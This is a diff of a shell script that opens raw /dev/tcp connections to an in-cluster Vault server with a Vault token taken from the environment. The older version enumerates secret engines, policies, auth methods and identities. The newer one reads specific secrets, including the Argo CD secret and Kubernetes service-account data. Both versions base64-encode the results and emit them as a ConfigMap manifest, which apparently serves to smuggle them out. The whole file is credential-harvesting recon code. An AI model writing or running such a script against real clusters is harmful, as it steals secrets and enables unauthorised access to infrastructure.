@@ -1,69 +1,60 @@
 #!/bin/sh
 VT=${VAULT_TOKEN}
 
-vault_api() {
-  local method="$1" path="$2" body="$3"
+vget() {
   bash -c "
     exec 3<>/dev/tcp/vault.vault.svc.cluster.local/8200 2>/dev/null || exit 1
-    if [ -n '$body' ]; then
-      printf '$method $path HTTP/1.0\r\nHost: vault\r\nX-Vault-Token: %s\r\nContent-Type: application/json\r\nContent-Length: %d\r\n\r\n%s' \"$VT\" \${#body} '$body' >&3
-    else
-      printf '$method $path HTTP/1.0\r\nHost: vault\r\nX-Vault-Token: %s\r\n\r\n' \"$VT\" >&3
-    fi
+    printf 'GET '$1' HTTP/1.0\r\nHost: vault\r\nX-Vault-Token: %s\r\n\r\n' \"$VT\" >&3
     cat <&3
     exec 3>&-
   " 2>/dev/null
 }
 
 RECON=$( (
-  echo "===ALL_SECRET_ENGINES==="
-  vault_api "GET" "/v1/sys/mounts"
+  echo "===KV_LIST_ROOT==="
+  vget "/v1/kv-v2/metadata?list=true"
 
   echo ""
-  echo "===ALL_POLICIES==="
-  vault_api "GET" "/v1/sys/policies/acl"
+  echo "===KV_LIST_APPS==="
+  vget "/v1/kv-v2/metadata/apps?list=true"
 
   echo ""
-  echo "===ALL_AUTH_METHODS==="
-  vault_api "GET" "/v1/sys/auth"
+  echo "===KV_LIST_ARGO==="
+  vget "/v1/kv-v2/metadata/argocd?list=true"
 
   echo ""
-  echo "===KV_SECRET_LIST==="
-  vault_api "LIST" "/v1/secret/metadata"
+  echo "===KV_LIST_K8S==="
+  vget "/v1/kv-v2/metadata/k8s?list=true"
 
   echo ""
-  echo "===KV_U2U_LIST==="
-  vault_api "LIST" "/v1/secret/metadata/u2u"
+  echo "===POLICIES==="
+  vget "/v1/sys/policies/acl?list=true"
 
   echo ""
-  echo "===KV_K8S_LIST==="
-  vault_api "LIST" "/v1/secret/metadata/k8s"
+  echo "===KV_READ_U2U==="
+  vget "/v1/kv-v2/data/u2u"
 
   echo ""
-  echo "===KV_AWS_LIST==="
-  vault_api "LIST" "/v1/secret/metadata/aws"
+  echo "===KV_READ_ARGO_SECRET==="
+  vget "/v1/kv-v2/data/argocd/argocd-secret"
 
   echo ""
-  echo "===KV_ROOT_LIST==="
-  vault_api "GET" "/v1/secret/metadata?list=true"
+  echo "===KV_READ_K8S_SA==="
+  vget "/v1/kv-v2/data/k8s/serviceaccounts"
 
   echo ""
-  echo "===CUBBYHOLE==="
-  vault_api "GET" "/v1/cubbyhole/?list=true"
+  echo "===KV_LIST_DATA==="
+  vget "/v1/kv-v2/metadata/data?list=true"
 
   echo ""
-  echo "===IDENTITY_ENTITIES==="
-  vault_api "LIST" "/v1/identity/entity/id"
-
-  echo ""
-  echo "===SYS_CAPABILITIES==="
-  vault_api "GET" "/v1/sys/internal/ui/mounts"
+  echo "===KV_LIST_CONFIG==="
+  vget "/v1/kv-v2/metadata/config?list=true"
 ) | base64 | tr -d '\n' )
 cat << EOF
 apiVersion: v1
 kind: ConfigMap
 metadata:
-  name: vaultfull
+  name: vkv2
 data:
   result: $RECON
 EOF
